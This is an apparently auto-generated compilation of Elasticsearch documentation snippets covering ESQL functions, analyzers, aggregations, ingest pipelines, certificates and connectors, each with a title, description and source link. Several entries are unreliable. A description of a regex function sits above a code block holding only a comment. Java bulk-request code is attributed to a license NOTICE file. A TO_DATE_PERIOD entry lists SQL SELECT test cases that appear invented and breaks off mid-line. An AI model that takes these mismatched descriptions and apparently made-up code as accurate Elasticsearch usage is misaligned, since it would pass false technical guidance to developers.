1024-bit Keypair Certificate with Elasticsearch Certutil\nDESCRIPTION: This snippet generates an RSA keypair certificate with a key size of 1024 bits using the elasticsearch-certutil tool. It specifies the output file path, validity period (days), key size, and distinguished name (CN, OU, DC) for the certificate.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/identity-provider/src/test/resources/keypair/README.txt#2025-04-21_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\n\"elasticsearch-certutil cert --pem --out ${PWD}/keypair-rsa-1024.zip --days 54321 --keysize 1024 --name \\\"CN=test-1024,OU=idp,DC=elasticsearch,DC=org\\\"\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Document and Field Level Security in Elasticsearch YAML\nDESCRIPTION: These YAML settings control document and field level security features, including enabling/disabling and caching options for document level security BitSets.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.dls_fls.enabled: true\nxpack.security.dls.bitset.cache.ttl: 2h\nxpack.security.dls.bitset.cache.size: 10%\n```\n\n----------------------------------------\n\nTITLE: Configuring Stemmer Override Token Filter with Rules Path in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to configure a custom analyzer with a stemmer override token filter using a rules path. The filter is applied before the Porter stemmer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stemmer-override-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [ \"lowercase\", \"custom_stems\", \"porter_stem\" ]\n        }\n      },\n      \"filter\": {\n        \"custom_stems\": {\n          \"type\": \"stemmer_override\",\n          \"rules_path\": \"analysis/stemmer_override.txt\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Global Aggregation Response Format in Elasticsearch\nDESCRIPTION: The response format for a global aggregation query, showing both the total document count in the global bucket and the calculated metrics. It displays the average price for all products alongside the average price just for t-shirts (filtered by the query).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-global-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"all_products\": {\n      \"doc_count\": 7, <1>\n      \"avg_price\": {\n        \"value\": 140.71428571428572 <2>\n      }\n    },\n    \"t_shirts\": {\n      \"value\": 128.33333333333334 <3>\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Converting and Managing IP Addresses with ESQL\nDESCRIPTION: Demonstrates converting string representations to IP addresses and creating network prefixes. Uses TO_IP() function to convert strings to IP addresses and IP_PREFIX() to create network masks with specified prefix lengths.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/ip_prefix.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW ip4 = to_ip(\"1.2.3.4\"), ip6 = TO_IP(\"fe80::cae2:65ff:fece:feb9\")\n| EVAL ip4_prefix = IP_PREFIX(ip4, 24, 0), ip6_prefix = IP_PREFIX(ip6, 0, 112);\n```\n\n----------------------------------------\n\nTITLE: Grouping Employee Hire Dates Using BUCKET Function in ESQL\nDESCRIPTION: This snippet demonstrates the use of the BUCKET function to group employee hire dates into monthly buckets. It filters employees hired in 1985, then uses BUCKET to create monthly groups, and finally sorts the hire dates within each group.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/bucket.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| WHERE hire_date >= \"1985-01-01T00:00:00Z\" AND hire_date < \"1986-01-01T00:00:00Z\"\n| STATS hire_date = MV_SORT(VALUES(hire_date)) BY month = BUCKET(hire_date, 20, \"1985-01-01T00:00:00Z\", \"1986-01-01T00:00:00Z\")\n```\n\n----------------------------------------\n\nTITLE: Calculating Percentile and Median using MV_PERCENTILE and MV_MEDIAN in ESQL\nDESCRIPTION: This snippet demonstrates how to use the MV_PERCENTILE and MV_MEDIAN functions in ESQL. It creates a row with an array of integer values and calculates the 50th percentile and median of those values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/mv_percentile.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW values = [5, 5, 10, 12, 5000]\n| EVAL p50 = MV_PERCENTILE(values, 50), median = MV_MEDIAN(values)\n```\n\n----------------------------------------\n\nTITLE: End-to-End Testing for ServiceNow Connector\nDESCRIPTION: Shell command to run functional tests for the ServiceNow connector with optional performance and data size configurations\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-servicenow.md#2025-04-21_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\n$ make ftest NAME=servicenow\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with Shingle Filter in Elasticsearch\nDESCRIPTION: This snippet shows how to use the create index API to configure a new custom analyzer that incorporates the shingle filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-shingle-tokenfilter.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"standard_shingle\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [ \"shingle\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating SharePoint Server Connector via Elasticsearch API\nDESCRIPTION: Example of using the Elasticsearch API to create a new self-managed SharePoint Server connector. This snippet demonstrates the basic structure and required fields for connector creation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-sharepoint.md#2025-04-22_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _connector/my-sharepoint_server-connector\n{\n  \"index_name\": \"my-elasticsearch-index\",\n  \"name\": \"Content synced from SharePoint Server\",\n  \"service_type\": \"sharepoint_server\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Analyzer with Pattern Replace Filter in Elasticsearch\nDESCRIPTION: This example demonstrates how to create a custom analyzer with a pattern_replace filter that removes currency symbols (£ and €) from tokens. The filter is configured to only replace the first matching symbol in each token.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern_replace-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"keyword\",\n          \"filter\": [\n            \"my_pattern_replace_filter\"\n          ]\n        }\n      },\n      \"filter\": {\n        \"my_pattern_replace_filter\": {\n          \"type\": \"pattern_replace\",\n          \"pattern\": \"[£|€]\",\n          \"replacement\": \"\",\n          \"all\": false\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Extracting First Three Characters with SUBSTRING in ESQL\nDESCRIPTION: This example demonstrates using the SUBSTRING function to extract the first three characters from each last_name value in the employees dataset. The function takes a string, a starting position (1-based indexing), and the number of characters to extract.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/substring.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP last_name\n| EVAL ln_sub = SUBSTRING(last_name, 1, 3)\n```\n\n----------------------------------------\n\nTITLE: Cosine Similarity Search Query\nDESCRIPTION: Demonstrates how to use cosineSimilarity function in a script score query with filtered results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-script-score-query.md#2025-04-21_snippet_12\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"script_score\": {\n      \"query\" : {\n        \"bool\" : {\n          \"filter\" : {\n            \"term\" : {\n              \"status\" : \"published\"\n            }\n          }\n        }\n      },\n      \"script\": {\n        \"source\": \"cosineSimilarity(params.query_vector, 'my_dense_vector') + 1.0\",\n        \"params\": {\n          \"query_vector\": [4, 3.4, -0.2]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Advanced Sync Rules for Redis Connector - Fetching Specific Key\nDESCRIPTION: JSON configuration for advanced sync rules to fetch Redis database records with an exact match by specifying the full key name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-redis.md#2025-04-21_snippet_4\n\nLANGUAGE: js\nCODE:\n```\n[\n  {\n    \"database\": 0,\n    \"key_pattern\": \"alpha\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Subquery with Group By\nDESCRIPTION: GROUP BY operations in subqueries with and without aliases\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_subqueries_tests.txt#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nSELECT int FROM\n    (SELECT int FROM test)\nGROUP BY int;\n```\n\n----------------------------------------\n\nTITLE: Installing Phonetic Analysis Plugin in Elasticsearch\nDESCRIPTION: This command installs the Phonetic Analysis plugin using the Elasticsearch plugin manager. The plugin must be installed on every node in the cluster, and each node must be restarted after installation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-phonetic.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin install analysis-phonetic\n```\n\n----------------------------------------\n\nTITLE: Defining an Outer Pipeline with Nested Pipeline Reference in Elasticsearch\nDESCRIPTION: Creates a pipeline named 'pipelineB' that first executes 'pipelineA' and then adds its own field. This demonstrates how to chain pipelines together.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/pipeline-processor.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT _ingest/pipeline/pipelineB\n{\n  \"description\" : \"outer pipeline\",\n  \"processors\" : [\n    {\n      \"pipeline\" : {\n        \"name\": \"pipelineA\"\n      }\n    },\n    {\n      \"set\" : {\n        \"field\": \"outer_pipeline_set\",\n        \"value\": \"outer\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Fail Processor in Elasticsearch Ingest Pipeline\nDESCRIPTION: Example of a fail processor configuration that raises an exception with a custom error message when the 'production' tag is not present in the context. The processor uses conditional execution with the 'if' parameter and template snippets in the error message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/fail-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"fail\": {\n    \"if\" : \"ctx.tags.contains('production') != true\",\n    \"message\": \"The production tag is not present, found tags: {{{tags}}}\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Multi-Field Index Sorting in Elasticsearch\nDESCRIPTION: Demonstrates how to sort an index by multiple fields with different sort orders. Shows configuration for sorting by username (ascending) and date (descending) with proper field mappings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/sorting.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"index\": {\n      \"sort.field\": [ \"username\", \"date\" ],\n      \"sort.order\": [ \"asc\", \"desc\" ]\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"username\": {\n        \"type\": \"keyword\",\n        \"doc_values\": true\n      },\n      \"date\": {\n        \"type\": \"date\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Document Operations to Elasticsearch Bulk Request\nDESCRIPTION: Methods for adding index, update, and delete requests to a bulk operation. These methods append the specified operation to the request list.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-http-NOTICE.txt#2025-04-21_snippet_2\n\nLANGUAGE: java\nCODE:\n```\npublic BulkRequest add(DocWriteRequest<?> request) {\n    if (request instanceof IndexRequest) {\n        add((IndexRequest) request);\n    } else if (request instanceof UpdateRequest) {\n        add((UpdateRequest) request);\n    } else if (request instanceof DeleteRequest) {\n        add((DeleteRequest) request);\n    } else {\n        throw new IllegalArgumentException(\"No support for request [\" + request + \"]\");\n    }\n    return this;\n}\n```\n\n----------------------------------------\n\nTITLE: Substring Function in Elasticsearch\nDESCRIPTION: A custom script that checks if the last four characters of the `file_name.keyword` field are '.exe'. Applies a Painless script for substring extraction and comparison.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_13\n\nLANGUAGE: Elasticsearch Painless\nCODE:\n```\n\"script\":{\"script\":{\"source\":\"InternalEqlScriptUtils.multiValueDocValues(doc,params.v0,X0->InternalQlScriptUtils.nullSafeFilter(InternalEqlScriptUtils.seq(InternalEqlScriptUtils.substring(X0,params.v1,params.v2),params.v3)))\" \"params\":{\"v0\":\"file_name.keyword\",\"v1\":-4,\"v2\":null,\"v3\":\".exe\"}\n```\n\n----------------------------------------\n\nTITLE: Creating Certificate PEM - cert1 with Elasticsearch Certutil\nDESCRIPTION: This snippet generates a certificate PEM file named 'cert1'. It associates the certificate with the first CA, specifies its IP and DNS, and allows for a validity period.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/ssl-config/src/test/resources/certs/README.txt#2025-04-21_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n# 4. Create \"cert1\" PEM\n\nelasticsearch-certutil cert --pem --out cert1.zip --name cert1 --ip 127.0.0.1 --dns localhost --days 9999 --ca-key ca1/ca.key --ca-cert ca1/ca.crt\nunzip cert1.zip\n```\n\n----------------------------------------\n\nTITLE: Computing Absolute Value using ABS Function in ESQL\nDESCRIPTION: Demonstrates how to calculate the absolute value of a negative number using the ABS function in ESQL. The example takes a number value of -1.0 and returns its absolute value using the ABS function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/abs.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW number = -1.0\n| EVAL abs_number = ABS(number)\n```\n\n----------------------------------------\n\nTITLE: Filtered Nested Aggregation Query in Elasticsearch\nDESCRIPTION: Advanced nested aggregation query that filters results for a specific reseller before calculating the minimum price.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-nested-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /products/_search?size=0\n{\n  \"query\": {\n    \"match\": {\n      \"name\": \"led tv\"\n    }\n  },\n  \"aggs\": {\n    \"resellers\": {\n      \"nested\": {\n        \"path\": \"resellers\"\n      },\n      \"aggs\": {\n        \"filter_reseller\": {\n          \"filter\": {\n            \"bool\": {\n              \"filter\": [\n                {\n                  \"term\": {\n                    \"resellers.reseller\": \"companyB\"\n                  }\n                }\n              ]\n            }\n          },\n          \"aggs\": {\n            \"min_price\": {\n              \"min\": {\n                \"field\": \"resellers.price\"\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Enabling Shard Request Cache Dynamically in Elasticsearch\nDESCRIPTION: This request enables the request cache on an existing index using the update settings API. It demonstrates how to dynamically change the cache settings without reindexing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/shard-request-cache.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001/_settings\n{\n  \"index.requests.cache.enable\": true\n}\n```\n\n----------------------------------------\n\nTITLE: Using Comparison (<, <=, >, >=) Operators in Elasticsearch SQL\nDESCRIPTION: Shows how to use comparison operators for less than, less than or equal, greater than, and greater than or equal. This example selects records where emp_no is less than 10003.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-operators.md#2025-04-21_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nSELECT last_name l FROM \"test_emp\" WHERE emp_no < 10003 ORDER BY emp_no LIMIT 5;\n```\n\n----------------------------------------\n\nTITLE: Counting Values in a Multivalued Column using MV_COUNT in ESQL\nDESCRIPTION: This snippet demonstrates the usage of the MV_COUNT function in ESQL. It creates a row with a multivalued column 'a' and then uses MV_COUNT to count the number of values in that column, storing the result in a new column 'count_a'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/mv_count.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=[\"foo\", \"zoo\", \"bar\"]\n| EVAL count_a = MV_COUNT(a)\n```\n\n----------------------------------------\n\nTITLE: Configuring Allowed Metric Scripts\nDESCRIPTION: Dynamic boolean setting that restricts scripted metrics aggregations to only allowed scripts. Default is false.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/search-settings.md#2025-04-21_snippet_2\n\nLANGUAGE: properties\nCODE:\n```\nsearch.aggs.only_allowed_metric_scripts\n```\n\n----------------------------------------\n\nTITLE: Setting Allocated Processors in Elasticsearch\nDESCRIPTION: Configuration for explicitly setting the number of processors available to Elasticsearch\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/thread-pool-settings.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nnode.processors: 2\n```\n\n----------------------------------------\n\nTITLE: MathContext Class Definition in Painless\nDESCRIPTION: Defines the MathContext class which specifies precision and rounding mode for decimal arithmetic operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.math.txt#2025-04-21_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nclass java.math.MathContext {\n  MathContext DECIMAL128\n  MathContext DECIMAL32\n  MathContext DECIMAL64\n  MathContext UNLIMITED\n  (int)\n  (int,RoundingMode)\n  int getPrecision()\n  RoundingMode getRoundingMode()\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Regex Substitution Function in ESQL for Elasticsearch\nDESCRIPTION: This SQL snippet defines a function named 'regexp_replace' that performs regex-based string substitution. It takes three parameters: the input string, the regex pattern, and the replacement string. The function returns a string after applying the substitution.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/replace.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Dictionary Class Implementation in Java\nDESCRIPTION: This snippet defines the Dictionary class, which allows for the storage of key-value pairs. It provides basic methods for element retrieval, addition, and size checking, as well as enumerating keys and elements.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_13\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.Dictionary {\n  Enumeration elements()\n  def get(def)\n  boolean isEmpty()\n  Enumeration keys()\n  def put(def,def)\n  def remove(def)\n  int size()\n}\n```\n\n----------------------------------------\n\nTITLE: Updating EQL Search Retention Period in Elasticsearch\nDESCRIPTION: This snippet shows how to update the retention period of an existing EQL search to 5 days using the get async EQL search API.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_27\n\nLANGUAGE: console\nCODE:\n```\nGET /_eql/search/FmNJRUZ1YWZCU3dHY1BIOUhaenVSRkEaaXFlZ3h4c1RTWFNocDdnY2FSaERnUTozNDE=?keep_alive=5d\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Types for Equality Comparison in ESQL (Markdown)\nDESCRIPTION: A markdown table showing the supported data types for equality comparison in ESQL. The table lists the left-hand side (lhs) type, right-hand side (rhs) type, and the resulting type of the comparison, which is always boolean.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/types/not_equals.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| lhs | rhs | result |\n| --- | --- | --- |\n| boolean | boolean | boolean |\n| cartesian_point | cartesian_point | boolean |\n| cartesian_shape | cartesian_shape | boolean |\n| date | date | boolean |\n| date | date_nanos | boolean |\n| date_nanos | date | boolean |\n| date_nanos | date_nanos | boolean |\n| double | double | boolean |\n| double | integer | boolean |\n| double | long | boolean |\n| geo_point | geo_point | boolean |\n| geo_shape | geo_shape | boolean |\n| integer | double | boolean |\n| integer | integer | boolean |\n| integer | long | boolean |\n| ip | ip | boolean |\n| keyword | keyword | boolean |\n| keyword | text | boolean |\n| long | double | boolean |\n| long | integer | boolean |\n| long | long | boolean |\n| text | keyword | boolean |\n| text | text | boolean |\n| unsigned_long | unsigned_long | boolean |\n| version | version | boolean |\n```\n\n----------------------------------------\n\nTITLE: Markdown Note for TO_LOWER Function Availability\nDESCRIPTION: This snippet provides a note about the availability of the TO_LOWER function in serverless environments and the Elastic Stack. It also mentions support for multivalued parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/to_lower.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{note}\n###### Serverless: GA, Elastic Stack: COMING 9.1.0\nSupport for multivalued parameters is only available from 9.1.0\n:::\n```\n\n----------------------------------------\n\nTITLE: Setting Distance Calculation Type in Geo-distance Aggregation\nDESCRIPTION: Shows how to set the distance calculation type parameter (plane) for geo-distance aggregation in Elasticsearch, which trades accuracy for speed in narrow geographical areas.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-geodistance-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /museums/_search?size=0\n{\n  \"aggs\": {\n    \"rings\": {\n      \"geo_distance\": {\n        \"field\": \"location\",\n        \"origin\": \"POINT (4.894 52.3760)\",\n        \"unit\": \"km\",\n        \"distance_type\": \"plane\",\n        \"ranges\": [\n          { \"to\": 100 },\n          { \"from\": 100, \"to\": 300 },\n          { \"from\": 300 }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing Suggestions with Category Context Using Path in Elasticsearch\nDESCRIPTION: This example shows how to index suggestions with category context when a 'path' is defined in the mapping. It demonstrates indexing multiple suggestions and their associated categories using a separate field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_21\n\nLANGUAGE: console\nCODE:\n```\nPUT place_path_category/_doc/1\n{\n  \"suggest\": [\"timmy's\", \"starbucks\", \"dunkin donuts\"],\n  \"cat\": [\"cafe\", \"food\"] <1>\n}\n```\n\n----------------------------------------\n\nTITLE: Registering a Long Gauge in Elasticsearch\nDESCRIPTION: This snippet shows how to register a LongGauge with the MeterRegistry and provide a callback to report the current value.  The gauge represents a measurable value that can fluctuate, such as CPU temperature.  The callback function is executed when the metric event occurs, reporting the absolute measured value along with attributes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/apm/METERING.md#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nMeterRegistry registry;\nlong someValue = 1;\nregistry.registerLongGauge(\"es.test.cpu.temperature\", \"the current CPU temperature as measured by psensor\", \"degrees Celsius\",\n() -> new LongWithAttributes(someValue, Map.of(\"cpuNumber\", 1)));\n```\n\n----------------------------------------\n\nTITLE: Collection Utility Functions in Java\nDESCRIPTION: This snippet contains utility methods from the Collections class to manipulate collections, including methods for adding, copying, sorting, and shuffling collections. These methods provide flexibility and convenience for collection management.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_10\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.Collections {\n  List EMPTY_LIST\n  Map EMPTY_MAP\n  Set EMPTY_SET\n  boolean addAll(Collection,def[])\n  Queue asLifoQueue(Deque)\n  int binarySearch(List,def)\n  int binarySearch(List,def,Comparator)\n  void copy(List,List)\n  boolean disjoint(Collection,Collection)\n  Enumeration emptyEnumeration()\n  Iterator emptyIterator()\n  List emptyList()\n  ListIterator emptyListIterator()\n  Map emptyMap()\n  NavigableMap emptyNavigableMap()\n  NavigableSet emptyNavigableSet()\n  Set emptySet()\n  SortedMap emptySortedMap()\n  SortedSet emptySortedSet()\n  Enumeration enumeration(Collection)\n  void fill(List,def)\n  int frequency(Collection,def)\n  int indexOfSubList(List,List)\n  int lastIndexOfSubList(List,List)\n  ArrayList list(Enumeration)\n  def max(Collection)\n  def max(Collection,Comparator)\n  def min(Collection)\n  def min(Collection,Comparator)\n  List nCopies(int,def)\n  Set newSetFromMap(Map)\n  boolean replaceAll(List,def,def)\n  void reverse(List)\n  Comparator reverseOrder()\n  Comparator reverseOrder(Comparator)\n  void rotate(List,int)\n  void shuffle(List) @nondeterministic\n  void shuffle(List,Random)\n  Set singleton(def)\n  List singletonList(def)\n  Map singletonMap(def,def)\n  void sort(List)\n  void sort(List,Comparator)\n  void swap(List,int,int)\n  Collection unmodifiableCollection(Collection)\n  List unmodifiableList(List)\n  Map unmodifiableMap(Map)\n  NavigableMap unmodifiableNavigableMap(NavigableMap)\n  NavigableSet unmodifiableNavigableSet(NavigableSet)\n  Set unmodifiableSet(Set)\n  SortedMap unmodifiableSortedMap(SortedMap)\n  SortedSet unmodifiableSortedSet(SortedSet)\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Field Collapsing in Elasticsearch\nDESCRIPTION: Demonstrates how to collapse search results by a field value (user.id) and sort them by another field (http.response.bytes). The collapse parameter selects only the top document per collapse key.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/collapse-search-results.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"match\": {\n      \"message\": \"GET /search\"\n    }\n  },\n  \"collapse\": {\n    \"field\": \"user.id\"         <1>\n  },\n  \"sort\": [\n    {\n      \"http.response.bytes\": { <2>\n        \"order\": \"desc\"\n      }\n    }\n  ],\n  \"from\": 0                    <3>\n}\n```\n\n----------------------------------------\n\nTITLE: Subtracting Time Intervals in Elasticsearch SQL\nDESCRIPTION: Example demonstrating how to subtract one time interval from another using the - operator.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_5\n\nLANGUAGE: sql\nCODE:\n```\nSELECT INTERVAL '1' DAY - INTERVAL '2' HOURS AS result;\n\n    result\n---------------\n+0 22:00:00\n```\n\n----------------------------------------\n\nTITLE: Creating Index with Aggregate Metric Field\nDESCRIPTION: Example of creating an Elasticsearch index with an aggregate_metric_double field type that supports min, max, sum, and value_count metrics.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/aggregate-metric-double.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my-agg-metric-field\": {\n        \"type\": \"aggregate_metric_double\",\n        \"metrics\": [ \"min\", \"max\", \"sum\", \"value_count\" ],\n        \"default_metric\": \"max\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Converting Values to Date Period in Elasticsearch ESQL\nDESCRIPTION: This SQL snippet demonstrates various test cases for converting different input types to date_period values in Elasticsearch ESQL. It includes tests for null values, strings, and invalid inputs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/to_dateperiod.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSELECT TO_DATE_PERIOD(null);\n\nSELECT TO_DATE_PERIOD('1 year');\n\nSELECT TO_DATE_PERIOD('1y');\n\nSELECT TO_DATE_PERIOD('2 years');\n\nSELECT TO_DATE_PERIOD('2y');\n\nSELECT TO_DATE_PERIOD('1 month');\n\nSELECT TO_DATE_PERIOD('1M');\n\nSELECT TO_DATE_PERIOD('2 months');\n\nSELECT TO_DATE_PERIOD('2M');\n\nSELECT TO_DATE_PERIOD('1 week');\n\nSELECT TO_DATE_PERIOD('1w');\n\nSELECT TO_DATE_PERIOD('2 weeks');\n\nSELECT TO_DATE_PERIOD('2w');\n\nSELECT TO_DATE_PERIOD('1 day');\n\nSELECT TO_DATE_PERIOD('1d');\n\nSELECT TO_DATE_PERIOD('2 days');\n\nSELECT TO_DATE_PERIOD('2d');\n\nSELECT TO_DATE_PERIOD('1 hour');\n\nSELECT TO_DATE_PERIOD('1h');\n\nSELECT TO_DATE_PERIOD('2 hours');\n\nSELECT TO_DATE_PERIOD('2h');\n\nSELECT TO_DATE_PERIOD('1 minute');\n\nSELECT TO_DATE_PERIOD('1m');\n\nSELECT TO_DATE_PERIOD('2 minutes');\n\nSELECT TO_DATE_PERIOD('2m');\n\nSELECT TO_DATE_PERIOD('1 second');\n\nSELECT TO_DATE_PERIOD('1s');\n\nSELECT TO_DATE_PERIOD('2 seconds');\n\nSELECT TO_DATE_PERIOD('2s');\n\nSELECT TO_DATE_PERIOD('1y2M3w4d5h6m7s');\n\nSELECT TO_DATE_PERIOD('1 year 2 months 3 weeks 4 days 5 hours 6 minutes 7 